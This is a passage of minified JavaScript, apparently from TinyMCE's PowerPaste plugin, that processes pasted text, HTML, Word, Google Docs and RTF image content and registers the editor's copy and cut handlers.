                  pcIsSpace: !0,
                  str: e.str + " ",
                }
            : {
                pcIsSpace: fm(t),
                str: e.str + t,
              }
          var n, r
        },
        {
          pcIsSpace: !1,
          str: "",
        }
      ).str
    },
    dm = function (e) {
      var t,
        n = ht.fromTag("div")
      return (t = e), (n.dom().textContent = t), eu(n)
    },
    mm = function (e) {
      var t = lm(e)
          .replace(/^[\r\n]*|[\r\n]*$/g, "")
          .split(/\n{2,}|(?:\r\n){2,}/),
        n = B(t, function (e) {
          return e.split(/\n|\r\n/).join("<br />")
        })
      return 1 === n.length
        ? n[0]
        : B(n, function (e) {
            return "<p>" + e + "</p>"
          }).join("")
    },
    pm = function (e) {
      var a = Wl(e).getOrDie("Required text input for Text Handler")
      return Wu(function (e) {
        var t,
          n,
          r,
          o,
          i =
            0 < a.text.length
              ? ((t = a.text),
                (n = dm(t)),
                (r = mm(n)),
                (o = qi(r)),
                Au.paste(o, []))
              : Au.cancel()
        Uu(e, {
          response: i,
          bundle: Ru({}),
        })
      })
    },
    gm = function (e, t) {
      return pm(e)
    },
    vm = function (e, o) {
      var t = function (e, t) {
          var n = ht.fromTag("div")
          Ji(n, e), xl(n)
          var r = Io(n)
          return ju({
            response: Au.paste(r, t),
            bundle: o.bundle(),
          })
        },
        n = b(Bu, o)
      return Au.cata(o.response(), n, t, n, t)
    },
    hm = function () {
      return function (e, t) {
        return Yu("errors.local.images.disallowed")
      }
    },
    ym = function () {
      return function (e, t) {
        var n = Bl(e).getOrDie("Must have image data for images handler")
        return em(n.images)
      }
    },
    bm = function (i) {
      return function (e, t) {
        var n = Ul(e).getOrDie("Wrong input type for HTML handler"),
          r = i.findClipboardTags(Io(n.container))
        r.each(function (e) {
          Y(e, Na)
        })
        var o = r.isSome()
        return ju({
          response: t.response(),
          bundle: Ru({
            isInternal: o,
          }),
        })
      }
    },
    Tm = function (a, u, c) {
      return function (e, t) {
        var n = Ul(e).getOrDie("Wrong input type for HTML handler").container,
          r = bo(u),
          o = t.bundle()
        if (wd.isInternal(o)) return am(r, n)
        a(n)
        var i = wd.merging(o)
        return im(r, n, i, c)
      }
    },
    xm = function (u, c, s) {
      return function (e, t) {
        var a = t.bundle()
        return wd
          .proxyBin(a)
          .handle(
            "There was no proxy bin setup. Ensure you have run proxyStep first.",
            function (e) {
              var t = wd.merging(a),
                n = wd.isWord(a),
                r = wd.isInternal(a),
                o = wd.backgroundAssets(a),
                i = bo(u)
              return r ? cm(i, c, e, s) : sm(i, e, t, n, o, s)
            }
          )
      }
    },
    Em = function (o, i) {
      return function (e, t) {
        var n = Yl(e).getOrDie("Wrong input type for Word Import handler"),
          r = wd.mergeOffice(t.bundle())
        return Qd(n, r, o, i)
      }
    },
    wm = function (r) {
      return function (e, t) {
        var n = Mu(t.bundle(), Ru(r))
        return ju({
          response: t.response(),
          bundle: n,
        })
      }
    },
    Sm = function (e, t) {
      return ju({
        response: Au.cancel(),
        bundle: Ru({}),
      })
    },
    Im = function (e, t) {
      return af(e, function (e) {
        return !!pt(e, "style") && -1 < mt(e, "style").indexOf("mso-")
      })
    },
    Lm = function (e, t) {
      var n = eu(e)
      return _c(n, t)
    },
    Nm = function (e, t) {
      var n = e.browser
      return (n.isIE() && 11 <= n.version.major ? Im : Lm)(t, e)
    },
    _m = Sd.resolve("smartpaste-eph-bin"),
    Cm = {
      binStyle: y(_m),
    },
    Om = fo()
  function Dm(r, f, o, l, i) {
    return function (e, t) {
      var n = jl(e).getOrDie("Must pass through event type").nativeEvent,
        c = i(),
        s = t.response()
      return Wu(function (u) {
        var e = r(o)
        e.events.after.bind(function (e) {
          var t = e.container()
          if (
            Om.browser.isSafari() &&
            Oi(t, 'img[src^="webkit-fake-url"]').isSome()
          ) {
            var n = Om.deviceType.isWebView()
              ? "webview.imagepaste"
              : "safari.imagepaste"
            Uu(u, {
              response: Au.error(n),
              bundle: Ru({}),
            })
          } else {
            f(t), Ti(t, Cm.binStyle())
            var r = Nm(Om, t),
              o = Io(t),
              i = l.findClipboardTags(o).isSome(),
              a = U(o, function (e) {
                return pt(e, "id") && to(mt(e, "id"), "docs-internal-guid")
              })
            Uu(u, {
              response: s,
              bundle: Ru({
                isWord: r,
                isGoogleDocs: a,
                isInternal: i,
                proxyBin: t,
                backgroundAssets: c,
              }),
            })
          }
        }),
          c.convert(n),
          e.run()
      })
    }
  }
  var Pm = function (e, t) {
      if (0 === e.length)
        throw new Error("Zero length content passed to Hex conversion")
      var n = (function (e) {
          for (var t = new Array(e.length / 2), n = 0; n < e.length; n += 2) {
            var r = e.substr(n, 2)
            t[Math.floor(n / 2)] = parseInt(r, 16)
          }
          return t
        })(e),
        r = new Uint8Array(n)
      return new g.Blob([r], {
        type: t,
      })
    },
    Am = de([
      {
        unsupported: ["id", "message", "isEquation", "attrs"],
      },
      {
        supported: ["id", "contentType", "blob", "isEquation", "attrs"],
      },
    ]),
    km = {
      unsupported: Am.unsupported,
      supported: Am.supported,
      cata: function (e, t, n) {
        return e.fold(t, n)
      },
    },
    Mm = function (e, t, n) {
      return t.indexOf(e, n)
    },
    Rm = function (e, t, n, r, o, i, a) {
      return -1 === e || -1 === t
        ? N.none()
        : N.some({
            start: e,
            end: t,
            bower: n,
            regex: r,
            idRef: o,
            isEquation: i,
            attrs: a,
          })
    },
    Fm = function (e, t, n) {
      return e.substring(t, n)
    },
    jm = function (e, t) {
      if (-1 === t) return t
      var n = 0,
        r = e.length
      do {
        var o = e.indexOf("{", t),
          i = e.indexOf("}", t)
        if (
          (o < i && -1 !== o
            ? ((t = o + 1), ++n)
            : (i < o || o < 0) && -1 !== i && ((t = i + 1), --n),
          r < t || -1 === i)
        )
          return -1
      } while (0 < n)
      return t
    },
    Um = function (e, t, n, r, o) {
      var i,
        a,
        u,
        c = Fm(e, n, r),
        s =
          ((a = Mm("\\picscalex", (i = e), n)),
          (u = Mm("\\bliptag", i, a)),
          -1 < a && a < u ? N.from(i.substring(a, u)) : N.none())
      return Rm(n, r, c, /[^a-fA-F0-9]([a-fA-F0-9]+)\}$/, "i", o, s)
    },
    Bm = function (e, t, n, r, o) {
      var i = Fm(e, n, r)
      return Rm(n, r, i, /([a-fA-F0-9]{64,})(?:\}.*)/, "s", o, N.none())
    },
    Ym = function (e, t) {
      var n = Mm("{\\pict{", e, t),
        r = jm(e, n),
        o = Mm("{\\shp{", e, t),
        i = jm(e, o),
        a = Mm("{\\mmathPict{", e, t),
        u = jm(e, a),
        c = -1 !== a && ((a < n && r < u) || (a < o && i < u)),
        s = b(Bm, e, t, o, i, c),
        f = b(Um, e, t, n, r, c)
      return -1 === n && -1 === o
        ? N.none()
        : -1 === n
        ? s()
        : -1 === o
        ? f()
        : o < n && r < i
        ? f()
        : n < o && i < r
        ? s()
        : n < o
        ? f()
        : o < n
        ? s()
        : N.none()
    },
    Wm = function (e, t) {
      return Ym(e, t)
    },
    Hm = function (e) {
      return 0 <= e.indexOf("\\pngblip")
        ? Fo.value("image/png")
        : 0 <= e.indexOf("\\jpegblip")
        ? Fo.value("image/jpeg")
        : Fo.error("errors.imageimport.unsupported")
    },
    qm = function (e, t) {
      var n = e.match(t)
      return n && n[1] && n[1].length % 2 == 0
        ? Fo.value(n[1])
        : Fo.error("errors.imageimport.invalid")
    },
    $m = function (e) {
      var t = e.match(/\\shplid(\d+)/)
      return null !== t ? N.some(t[1]) : N.none()
    },
    Vm = function (e) {
      for (
        var u = [],
          t = function () {
            return e.length
          },
          n = function (e) {
            var t,
              r,
              o,
              i,
              a,
              n =
                ((r = (t = e).bower),
                (o = t.regex),
                (i = t.isEquation),
                (a = t.attrs),
                $m(r).map(function (e) {
                  var n = t.idRef + e
                  return Hm(r).fold(
                    function (e) {
                      return km.unsupported(n, e, i, a)
                    },
                    function (t) {
                      return qm(r, o).fold(
                        function (e) {
                          return km.unsupported(n, e, i, a)
                        },
                        function (e) {
                          return km.supported(n, t, Pm(e, t), i, a)
                        }
                      )
                    }
                  )
                }))
            return (u = u.concat(n.toArray())), e.end
          },
          r = 0;
        r < e.length;

      )
        r = Wm(e, r).fold(t, n)
      return u
    },
    Xm = function (e) {
      var t = e.replace(/\r/g, "").replace(/\n/g, "")
      return Vm(t)
    },
    Gm = function (e) {
      return Xm(e)
    },
    Km = function (e) {
      return km.cata(
        e,
        function (e, t, n) {
          return e
        },
        function (e, t, n, r, o) {
          return e
        }
      )
    },
    zm = function (e) {
      return km.cata(
        e,
        function (e, t, n) {
          return n
        },
        function (e, t, n, r, o) {
          return r
        }
      )
    },
    Jm = function (e) {
      return km.cata(
        e,
        function (e, t, n) {
          return Fo.error(t)
        },
        function (e, t, n, r, o) {
          return Fo.value(n)
        }
      )
    }
  function Zm(u, c, s, f, l) {
    return u.toCanvas().then(function (e) {
      return (
        (t = e),
        (n = u.getType()),
        (r = c),
        (o = s),
        De((i = Ce(f, l))).drawImage(t, -r, -o),
        Re((a = i), n).then(function (e) {
          return Be(Pe.resolve(a), e, a.toDataURL())
        })
      )
      var t, n, r, o, i, a
    })
  }
  var Qm = function (e, t) {
      var n = new RegExp("\\\\pic" + t + "(\\-?\\d+)\\\\"),
        r = e.match(n)[1]
      return parseInt(r, 10)
    },
    ep = function (e, t, n) {
      var r = b(Qm, e),
        o = r("wgoal"),
        i = r("hgoal"),
        a = o / t,
        u = i / n,
        c = r("cropl"),
        s = r("cropt")
      return {
        cropl: c / a,
        cropt: s / u,
        cropw: (o - c - r("cropr")) / a,
        croph: (i - s - r("cropb")) / u,
      }
    },
    tp = function (m, e) {
      return e.fold(
        function () {
          return new he(function (e) {
            return e(m)
          })
        },
        function (d) {
          return pe.cata(
            m,
            function (s, f, l) {
              return f.toCanvas().then(function (e) {
                var t,
                  n,
                  r,
                  o,
                  i,
                  a = parseInt(mt(ht.fromDom(e), "width"), 10) || 1,
                  u = parseInt(mt(ht.fromDom(e), "height"), 10) || 1,
                  c = ep(d, a, u)
                return a === c.cropw &&
                  u === c.croph &&
                  0 === c.cropl &&
                  0 === c.cropt
                  ? he.resolve(m)
                  : ((t = f),
                    (n = c.cropl),
                    (r = c.cropt),
                    (o = c.cropw),
                    (i = c.croph),
                    Zm(t, n, r, o, i)).then(function (n) {
                      return n.toBlob().then(function (e) {
                        g.URL.revokeObjectURL(l)
                        var t = g.URL.createObjectURL(e)
                        return pe.blob(s, n, t)
                      })
                    })
              })
            },
            function (e, t, n) {
              return new he(function (e) {
                return e(m)
              })
            }
          )
        }
      )
    },
    np = function (e, n) {
      return e.length === n.length
        ? he.all(
            B(e, function (e, t) {
              return tp(e, n[t])
            })
          )
        : he.resolve(e)
    },
    rp = function (e, t, i, a, u) {
      var c = [],
        s = [],
        f = !1
      return {
        blobs: G(e, function (r, n) {
          var o = mt(r, "data-image-id")
          return (
            gt(r, "rtf-data-image"),
            gt(r, "data-image-id"),
            gt(r, "data-ms-equation"),
            u || gt(r, "data-image-src"),
            "unsupported" === o
              ? ((f = !0),
                lt(r, "alt", i("errors.imageimport.unsupported")),
                [])
              : $(t, function (e, t) {
                  return a(e, t, o, n)
                }).fold(
                  function () {
                    return (
                      g.console.log(
                        "WARNING: unable to find data for image ",
                        r.dom()
                      ),
                      (f = !0),
                      lt(r, "alt", i("errors.imageimport.unsupported")),
                      []
                    )
                  },
                  function (n) {
                    return Jm(n).fold(
                      function (e) {
                        return (
                          (f = !0),
                          g.console.error("PowerPaste error code: RTF04"),
                          lt(r, "alt", i(e)),
                          []
                        )
                      },
                      function (e) {
                        var t
                        return (
                          c.push(r),
                          s.push(
                            ((t = n),
                            km.cata(
                              t,
                              function (e, t, n) {
                                return N.none()
                              },
                              function (e, t, n, r, o) {
                                return o
                              }
                            ))
                          ),
                          u && gt(r, "data-image-src"),
                          [e]
                        )
                      }
                    )
                  }
                )
          )
        }),
        filteredImages: c,
        imageAttrs: s,
        failedImage: f,
      }
    },
    op = {
      convert: function (e, t, n, r, o) {
        var i = q(
            t,
            function (t, n) {
              var r = Km(n),
                o = zm(n)
              return V(t, function (e) {
                return !(o || zm(e)) && Km(e) === r
              }).fold(
                function () {
                  return t.concat([n])
                },
                function (e) {
                  return Jm(t[e]).isValue()
                    ? t
                    : t
                        .slice(0, e)
                        .concat(t.slice(e + 1))
                        .concat([n])
                }
              )
            },
            []
          ),
          a = o.keepSrc || !1,
          u = W(i, function (e) {
            return !zm(e)
          }),
          c = u.pass,
          s = u.fail,
          f = W(e, function (e) {
            return !("true" === mt(e, "data-ms-equation"))
          }),
          l = f.pass,
          d = f.fail,
          m = rp(
            l,
            c,
            r,
            function (e, t, n, r) {
              return Km(e) === n
            },
            a
          ),
          p = rp(
            d,
            s,
            r,
            function (e, t, n, r) {
              return t === r
            },
            a
          ),
          g = m.filteredImages.concat(p.filteredImages),
          v = m.imageAttrs.concat(p.imageAttrs),
          h = m.blobs.concat(p.blobs),
          y = m.failedImage || p.failedImage
        ze(h).get(function (e) {
          np(e, v).then(function (e) {
            var t = fd(e, g)
            n(t, y)
          })
        })
      },
    },
    ip = function (e) {
      return Co(e, "[rtf-data-image]")
    },
    ap = {
      exists: function (e) {
        return 0 < ip(e).length
      },
      find: ip,
    }
  function up(i) {
    var a,
      u,
      c =
        ((a = i.translations),
        {
          events: (u = yr.create({
            insert: hr(["elements", "correlated"]),
            incomplete: hr(["elements", "correlated", "message"]),
          })).registry,
          processRtf: function (o, i, e, t) {
            var n = Gm(e),
              r = ap.find(o)
            op.convert(
              r,
              n,
              function (e, t) {
                var n = Io(o),
                  r = e.concat(i)
                t
                  ? (console.error("PowerPaste error code: RTF01"),
                    u.trigger.incomplete(n, r, "errors.imageimport.failed"))
                  : u.trigger.insert(n, r)
              },
              a,
              t
            )
          },
        }),
      s = Pr(N.none()),
      f = function (t) {
        s.get().each(function (e) {
          Uu(e, {
            response: t,
            bundle: Ru({}),
          })
        })
      }
    return (
      c.events.insert.bind(function (e) {
        f(Au.paste(e.elements(), e.correlated()))
      }),
      c.events.incomplete.bind(function (e) {
        console.error("PowerPaste error code: RTF02"),
          f(Au.incomplete(e.elements(), e.correlated(), e.message()))
      }),
      function (e, r) {
        var t = Yl(e).getOrDie("Word input required for rtf data"),
          n = function (o) {
            return Wu(function (t) {
              var e = function () {
                  Uu(t, {
                    response: r.response(),
                    bundle: r.bundle(),
                  })
                },
                n = function (e, n) {
                  s.set(N.some(t))
                  var r = ht.fromTag("div")
                  Ji(r, e),
                    o.fold(
                      function () {
                        var e,
                          t = ap.find(r)
                        return 0 < t.length
                          ? (function (e) {
                              Y(e, Na)
                              var t = Io(r)
                              console.error("PowerPaste error code: RTF03"),
                                f(
                                  Au.incomplete(
                                    t,
                                    n,
                                    "errors.imageimport.failed"
                                  )
                                )
                            })(t)
                          : ((e = Io(r)), void f(Au.paste(e, n)))
                      },
                      function (e) {
                        c.processRtf(r, n, e, i)
                      }
                    )
                }
              Au.cata(r.response(), e, n, e, n)
            })
          }
        return (function (t, n) {
          var e = ie(n)
          if (e.length !== Il.length) throw new Error("Partial match")
          return du(e, function (e) {
            return mu(t.discriminator === e, n[e])
          }).getOrDie("Must find branch for constructor: " + t.discriminator)(
            t.data
          )
        })(t.rtf, {
          disabled: function () {
            return n(N.none())
          },
          fromClipboard: function (e) {
            return n(!0 === i.allowLocalImages ? N.some(e.rtf) : N.none())
          },
        })
      }
    )
  }
  var cp = function (o) {
    var i = function () {
      return Ee.pure(o)
    }
    return pe.cata(
      o.asset(),
      function (e, t, n) {
        return /tiff$/.test(t.getType())
          ? ((r = t),
            Ee.nu(function (t) {
              var e = $e(r, "image/png").then(function (e) {
                Ge(e).map(N.some).get(t)
              })
              return e.catch.call(e, function (e) {
                return g.console.warn(e), t(N.none()), e
              })
            })).map(function (e) {
              return e
                .map(function (e) {
                  var t = o.image()
                  return g.URL.revokeObjectURL(n), sd(e, t), cd(e, t)
                })
                .getOr(o)
            })
          : i()
        var r
      },
      i
    )
  }
  function sp() {
    return function (e, o) {
      return Wu(function (n) {
        var e = function () {
            Uu(n, {
              response: o.response(),
              bundle: o.bundle(),
            })
          },
          r = function (e, t) {
            Le(e, cp).get(function (e) {
              Uu(n, {
                response: t(e),
                bundle: o.bundle(),
              })
            })
          }
        Au.cata(
          o.response(),
          e,
          function (t, e) {
            r(e, function (e) {
              return Au.paste(t, e)
            })
          },
          e,
          function (t, e, n) {
            r(e, function (e) {
              return (
                g.console.error("PowerPaste error code:  IMG01"),
                Au.incomplete(t, e, n)
              )
            })
          }
        )
      })
    }
  }
  var fp = function (e) {
      return y(e)
    },
    lp = function (e, t) {
      return e.isSupported() ? t.getWordData() : N.none()
    },
    dp = function (e) {
      return e.getNative()
    },
    mp = function (e) {
      return e.getImage()
    },
    pp = function (e) {
      return e.getHtml()
    },
    gp = function (e) {
      return e.getText()
    },
    vp = function (e) {
      return e.getOnlyText()
    },
    hp = function (e) {
      return e.getGoogleDocsData()
    },
    yp = function (e) {
      return e.getVoid()
    },
    bp = function (e, t, n, r) {
      return {
        _label: e,
        label: y(e),
        getAvailable: t,
        steps: y(n),
        capture: y(r),
      }
    },
    Tp = function (e, t, n, r) {
      return {
        _label: e,
        label: y(e),
        getAvailable: t,
        steps: y(n),
        capture: y(r),
      }
    },
    xp = function (e, t, n, r) {
      return bp(
        od.native,
        pp,
        [
          fp(bm(t.intraFlag)),
          fp(_d(e, t)),
          fp(Tm(n, r, t)),
          fp(bd(t)),
          fp(sp()),
        ],
        !0
      )
    },
    Ep = function (e, t, n, r, o) {
      return Tp(
        od.fallback,
        dp,
        [
          fp(Dm(r, n, o, t.intraFlag, ud)),
          fp(_d(e, t)),
          fp(xm(o, t.intraFlag, t)),
          fp(bd(t)),
          fp(sp()),
        ],
        !1
      )
    },
    wp = function (e, t, n) {
      return bp(
        od.msoffice,
        b(lp, e),
        [
          fp(
            wm({
              isWord: !0,
            })
          ),
          fp(Nd(t, n)),
          fp(Em(e, n)),
          ((r = up(n)),
          function (n) {
            return function (e, t) {
              return (
                n.block(),
                r(e, t).map(function (e) {
                  return n.unblock(), e
                })
              )
            }
          }),
          fp(sp()),
        ],
        !0
      )
      var r
    },
    Sp = function (e, t, n) {
      return bp(
        od.googledocs,
        hp,
        [
          fp(
            wm({
              officeStyles: !1,
              htmlStyles: !1,
            })
          ),
          fp(Tm(t, n, e)),
          fp(bd(e)),
          fp(sp()),
        ],
        !0
      )
    },
    Ip = function (e) {
      return bp(
        od.image,
        mp,
        [fp(!1 === e.allowLocalImages ? hm() : ym()), fp(sp())],
        !0
      )
    },
    Lp = function () {
      return bp(od.plaintext, vp, [fp(gm), fp(vm)], !0)
    },
    Np = function () {
      return bp(od.text, gp, [fp(gm), fp(vm)], !0)
    },
    _p = function () {
      return Tp(od.discard, yp, [fp(Sm)], !0)
    }
  var Cp = {
      nodeToString: function (e) {
        var t = document.createElement("div")
        t.appendChild(e.cloneNode(!0))
        var n = t.innerHTML
        return (t = e = null), n
      },
      restoreStyleAttrs: function (e) {
        Y(B(e.getElementsByTagName("*"), ht.fromDom), function (e) {
          pt(e, "data-mce-style") &&
            !pt(e, "style") &&
            lt(e, "style", mt(e, "data-mce-style"))
        })
      },
    },
    Op = "x-tinymce/html",
    Dp = "\x3c!-- " + Op + " --\x3e",
    Pp = {
      mark: function (e) {
        return Dp + e
      },
      unmark: function (e) {
        return e.replace(Dp, "")
      },
      isMarked: function (e) {
        return -1 !== e.indexOf(Dp)
      },
      retainContentEditable: function (e) {
        return e.replace(
          / contenteditable="([^"]+)"/g,
          ' data-mce-contenteditable="$1"'
        )
      },
      restoreContentEditable: function (e) {
        return e.replace(
          / data-mce-contenteditable="([^"]+)"/g,
          ' contenteditable="$1"'
        )
      },
      internalHtmlMime: y(Op),
    },
    Ap = function () {},
    kp = function (e, t, n) {
      if (
        ((r = e),
        !1 !== tinymce.Env.iOS ||
          void 0 === r ||
          "function" != typeof r.setData)
      )
        return !1
      try {
        return (
          e.clearData(),
          e.setData("text/html", t),
          e.setData("text/plain", n),
          e.setData(Pp.internalHtmlMime(), t),
          !0
        )
      } catch (e) {
        return !1
      }
      var r
    },
    Mp = function (e, t, n, r) {
      kp(e.clipboardData, t.html, t.text)
        ? (e.preventDefault(), r())
        : n(t.html, r)
    },
    Rp = function (a) {
      return function (e, t) {
        var n = a.dom.create("div", {
            contenteditable: "false",
            "data-mce-bogus": "all",
          }),
          r = a.dom.create(
            "div",
            {
              contenteditable: "true",
              "data-mce-bogus": "all",
            },
            e
          )
        a.dom.setStyles(n, {
          position: "fixed",
          top: "50%",
          left: "-3000px",
          width: "1000px",
          overflow: "hidden",
        }),
          n.appendChild(r),
          a.dom.add(a.getBody(), n)
        var o = a.selection.getRng()
        r.focus()
        var i = a.dom.createRng()
        i.selectNodeContents(r),
          a.selection.setRng(i),
          setTimeout(function () {
            a.selection.setRng(o), n.parentNode.removeChild(n), t()
          }, 0)
      }
    },
    Fp = function (e) {
      var t = Pp.retainContentEditable(
        e.selection.getContent({
          contextual: !0,
        })
      )
      return {
        html: Pp.mark(t),
        text: e.selection.getContent({
          format: "text",
        }),
      }
    },
    jp = {
      register: function (e) {
        var t, n
        e.on(
          "cut",
          ((t = e),
          function (e) {
            !1 === t.selection.isCollapsed() &&
              Mp(e, Fp(t), Rp(t), function () {
                if (fo().browser.isChrome()) {
                  var e = t.selection.getRng()
                  tinymce.util.Delay.setEditorTimeout(
                    t,
                    function () {
                      t.selection.setRng(e), t.execCommand("Delete")
                    },
                    0
                  )
                } else t.execCommand("Delete")
              })
          })
        ),
          e.on(
            "copy",
            ((n = e),
            function (e) {
              !1 === n.selection.isCollapsed() && Mp(e, Fp(n), Rp(n), Ap)
            })
          )
      },
    },
    Up = sr("url", "html"),
    Bp = function (e) {
      return /^https?:\/\/[\w\?\-\/+=.&%@~#]+$/i.test(e)
    },
    Yp = Bp,
    Wp = function (e) {
      return Bp(e) && /.(gif|jpe?g|png)$/.test(e)
    },
    Hp = function (n) {
      var e = /^<a href="([^"]+)">([^<]+)<\/a>$/.exec(n)
      return N.from(e).bind(function (e) {
        var t = Up(e[1], n)
        return mu(e[1] === e[2], t)
      })
    },
    qp = function (e, t, n) {
      return "extra" in e.undoManager
        ? (e.undoManager.extra(function () {
            $p(e, t)
          }, n),
          N.some(!0))
        : N.none()
    },
    $p = function (e, t) {
      return (
        e.insertContent(t, {
          merge: !1 !== e.settings.paste_merge_formats,
          paste: !0,
        }),
        N.some(!0)
      )
    },
    Vp = {
      until: function (t, n, e) {
        return du(e, function (e) {
          return e(t, n)
        })
      },
      linkSelection: function (r, e) {
        return Hp(e).bind(function (e) {
          var t, n
          return !1 === r.selection.isCollapsed() && Yp(e.url())
            ? qp((t = r), (n = e).html(), function () {
                t.execCommand("mceInsertLink", !1, n.url())
              })
            : N.none()
        })
      },
      insertImage: function (r, e) {
        return Hp(e).bind(function (e) {
          return Wp(e.url())
            ? qp((t = r), (n = e).html(), function () {
                t.insertContent('<img src="' + n.url() + '">')
              })
            : N.none()
          var t, n
        })
      },
      insertContent: $p,
    },
    Xp = function (e, t) {
      return e.hasEventListeners(t)
    },
    Gp = function (e) {
      return e.plugins.powerpaste
    },
    Kp = {
      process: function (e, t, n, r, o) {
        var i,
          a,
          u,
          c,
          s,
          f,
          l,
          d,
          m,
          p,
          g,
          v,
          h,
          y,
          b,
          T,
          x,
          E,
          w,
          S,
          I,
          L = Pp.unmark(t)
        return (
          (y = L),
          (b = n),
          (T = r),
          (x = o),
          (a = Xp((h = i = e), "PastePreProcess")
            ? ((E = y),
              (w = b),
              (S = T),
              (I = x),
              h.fire("PastePreProcess", {
                internal: w,
                content: E,
                source: S,
                mode: I,
              }).content)
            : y),
          (u = n),
          (c = r),
          (s = o),
          Xp(i, "PastePostProcess")
            ? ((l = a),
              (d = u),
              (m = c),
              (p = s),
              (g = (f = i).dom.add(
                f.getBody(),
                "div",
                {
                  style: "display:none",
                },
                l
              )),
              (v = f.fire("PastePostProcess", {
                internal: d,
                node: g,
                source: m,
                mode: p,
              }).node.innerHTML),
              f.dom.remove(g),
              v)
            : a
        )
      },
      registerEvents: function (t) {
        var n = t.settings
        n.paste_preprocess &&
          t.on("PastePreProcess", function (e) {
            n.paste_preprocess.call(t, Gp(t), e)
          }),
          n.paste_postprocess &&
            t.on("PastePostProcess", function (e) {
              n.paste_postprocess.call(t, Gp(t), e)
            })
      },
    }
  var zp = {
      showDialog: function (e, t) {
        var n = {
          title: "Error",
          body: {
            type: "panel",
            items: [
              {
                type: "htmlpanel",
                name: "errorpanel",
                html: t,
              },
            ],
          },
          initialData: {},
          buttons: [
            {
              text: "OK",
              type: "cancel",
              name: "ok",
              primary: !0,
            },
          ],
        }
        e.windowManager.open(n)
      },
    },
    Jp = {
      init: function () {
        var r = Pr([
            {
              text: "Close",
              name: "close",
              type: "custom",
              primary: !0,
            },
          ]),
          o = Pr({})
        return {
          setButtons: function (e) {
            var n = {},
              t = B(e, function (e) {
                var t = e.text
                return (
                  (n[t.toLowerCase()] = e.click),
                  {
                    text: t,
                    name: t.toLowerCase(),
                    type: "custom",
                  }
                )
              })
            o.set(n), r.set(t)
          },
          getButtons: r.get,
          getAction: function (e) {
            var t = o.get()
            return t.hasOwnProperty(e) ? N.some(t[e]) : N.none()
          },
        }
      },
    }
  function Zp(h, y, e, t, b, T) {
    var x,
      E,
      n,
      r,
      w = Pr(N.none())
    ;(n = t ? t.jsUrl : e),
      (r = "/js"),
      (E = n.replace(/\/$/, "") + "/" + r.replace(/^\//, ""))
    var S = function (e, t, n) {
        var r,
          o =
            !1 !== e.settings.smart_paste
              ? [Vp.linkSelection, Vp.insertImage]
              : []
        Vp.until(
          e,
          t,
          o.concat([
            ((r = n),
            function (e, t) {
              return (
                e.undoManager.transact(function () {
                  Vp.insertContent(e, t),
                    Cp.restoreStyleAttrs(e.getBody()),
                    b.prepareImages(r)
                }),
                N.some(!0)
              )
            }),
          ])
        )
      },
      I = function () {
        x && h.selection.moveToBookmark(x), (x = null)
      }
    h.on("init", function (e) {
      var s,
        a,
        t,
        n,
        r,
        o,
        i,
        u,
        c,
        f,
        l = {
          baseUrl: E,
          cacheSuffix: h.settings.cache_suffix,
          officeStyles: h.settings.powerpaste_word_import || or.officeStyles,
          htmlStyles: h.settings.powerpaste_html_import || or.htmlStyles,
          translations: bt.translate,
          allowLocalImages: !1 !== h.settings.powerpaste_allow_local_images,
          pasteBinAttrs: {
            "data-mce-bogus": "all",
          },
          intraFlag: {
            clipboardType: Pp.internalHtmlMime,
            findClipboardTags: function (e) {
              var t = H(e, function (e) {
                return ut(e) && eo(mf(e), Pp.internalHtmlMime())
              })
              return t.length ? N.some(t) : N.none()
            },
          },
          preprocessor: function (e) {
            return Ee.pure(e)
          },
          keepSrc: ee(h),
          cleanFilteredInlineElements: te(h),
        },
        d = T
          ? ((a = h),
            {
              createDialog: function () {
                var n = "",
                  r = null,
                  o = Jp.init(),
                  t = yr.create({
                    close: hr([]),
                  }),
                  i = function (e) {
                    t.trigger.close()
                  }
                return {
                  events: t.registry,
                  setTitle: function (e) {
                    return (n = e)
                  },
                  setContent: function (e) {
                    return (r = e)
                  },
                  setButtons: function (e) {
                    o.setButtons(e)
                  },
                  show: function () {
                    var e = Cp.nodeToString(r.dom()),
                      t = {
                        title: n,
                        body: {
                          type: "panel",
                          items: [
                            {
                              type: "htmlpanel",
                              name: "contentPanel",
                              html: e,
                            },
                          ],
                        },
                        initialData: {},
                        buttons: o.getButtons(),
                        onCancel: i,
                        onAction: function (t, e) {
                          o.getAction(e.name).each(function (e) {
                            return e(t)
                          }),
                            t.close()
                        },
                      }
                    a.windowManager.open(t)
                  },
                  destroy: L,
                  reflow: function () {},
                }
              },
            })
          : ((s = h),
            {
              createDialog: function () {
                var r,
                  o = "",
                  i = "",
                  a = [],
                  u = null,
                  t = yr.create({
                    close: hr([]),
                  }),
                  c = function (e) {
                    t.trigger.close()
                  },
                  e = function () {
                    r.off("close", c), r.close("close")
                  }
                return {
                  events: t.registry,
                  setTitle: function (e) {
                    o = e
                  },
                  setContent: function (e) {
                    var t = Cp.nodeToString(e.dom())
                    ;(i = [
                      {
                        type: "container",
                        html: t,
                      },
                    ]),
                      (u = e)
                  },
                  setButtons: function (e) {
                    var r = []
                    e.forEach(function (e, t, n) {
                      r.push({
                        text: e.text,
                        ariaLabel: e.text,
                        onclick: e.click,
                      })
                    }),
                      (a = r)
                  },
                  show: function () {
                    0 === a.length &&
                      (a = [
                        {
                          text: "Close",
                          onclick: function () {
                            r.close()
                          },
                        },
                      ])
                    var e = {
                      title: o,
                      spacing: 10,
                      padding: 10,
                      minWidth: 300,
                      minHeight: 100,
                      layout: "flex",
                      items: i,
                      buttons: a,
                    }
                    r = s.windowManager.open(e)
                    var t = ht.fromDom(r.getEl()),
                      n = Oi(t, "." + mt(u, "class")).getOrDie(
                        "We must find this element or we cannot continue"
                      )
                    $i(n, u), Na(n), r.on("close", c)
                  },
                  hide: function () {
                    e()
                  },
                  destroy: function () {
                    e()
                  },
                  reflow: function () {},
                }
              },
            }),
        m = ht.fromDom(h.getBody()),
        p =
          ((t = m),
          (n = d.createDialog),
          (r = L),
          (i = Ia((o = l).baseUrl, o.cacheSuffix)),
          (u = Ou(void 0 !== o.pasteBinAttrs ? o.pasteBinAttrs : {})),
          (c = [Lp(), wp(i, n, o), Sp(o, r, t), xp(n, o, r, t), Ip(o)]),
          (f = Ep(n, o, r, u, t)),
          ad(c, f)),
        g = ad([Np()], _p())
      Y([p, g], function (e) {
        e.events.cancel.bind(function () {
          I()
        }),
          e.events.error.bind(function (e) {
            I(),
              h.notificationManager
                ? h.notificationManager.open({
                    text: bt.translate(e.message()),
                    type: "error",
                  })
                : (T ? zp : ta).showDialog(h, bt.translate(e.message()))
          }),
          e.events.insert.bind(function (e) {
